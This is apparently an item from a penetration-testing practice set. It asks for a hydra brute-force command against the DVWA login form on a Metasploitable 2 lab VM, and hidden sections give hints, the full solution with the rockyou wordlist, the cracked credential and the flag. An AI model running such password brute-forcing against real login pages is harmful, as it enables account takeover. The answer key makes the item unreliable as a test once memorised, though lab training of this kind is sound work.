# Q094 — DVWA Login Bruteforce

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` (Metasploitable 2) |
| **Domain** | 12 — Web Apps / 13 — SQLi |
| **Difficulty** | 🟡 Medium |
| **Tools** | `burpsuite`, `sqlmap`, `gobuster`, `nikto`, `curl` |
| **Time budget** | 15–25 min |

---

## 📝 Question

Use hydra against DVWA login (low security). Provide command using POST form.

---

## 🎯 Flag Format

```
cmd=<short>
```

Example: `cmd=hydra http-post-form ...`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

`hydra <ip> http-post-form '/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed'`
</details>

<details>
<summary>Hint 2</summary>

Need to inspect login form first.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.52.129 http-post-form '/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed'
```

Cracks `admin:password`.

**Answer:** `cmd=hydra ... http-post-form`

📖 Ref: [tools/hydra.md](../../tools/hydra.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
1. Verify VMs running: ping 192.168.52.129 and ping 192.168.52.130 from 192.168.52.128.
2. Required services for this Q already up by default on the relevant target.
3. If something is down, restart it on the target VM.

Report back: "Lab ready for Q094".
```
